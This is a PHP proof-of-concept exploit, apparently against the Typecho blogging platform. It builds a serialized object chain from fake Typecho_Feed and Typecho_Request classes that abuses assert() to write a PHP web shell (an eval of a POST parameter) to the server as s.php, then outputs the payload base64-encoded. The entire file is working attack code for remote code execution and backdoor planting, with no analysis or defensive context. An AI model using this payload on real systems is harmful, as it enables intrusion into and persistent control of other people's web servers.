<?php 

class Typecho_Feed{
    private $_type='ATOM 1.0';
    private $_items;

    public function __construct(){
        $this->_items = array(
            '0'=>array(
                'author'=> new Typecho_Request())
        );
    }
}


class Typecho_Request{
    private $_params = array('screenName'=>"file_put_contents('s.php', '<?php eval(\$_POST[c]);?>')");
    private $_filter = array('assert');
}


$poc = array(
'adapter'=>new Typecho_Feed(),
'prefix'=>'typecho');

echo base64_encode(serialize($poc));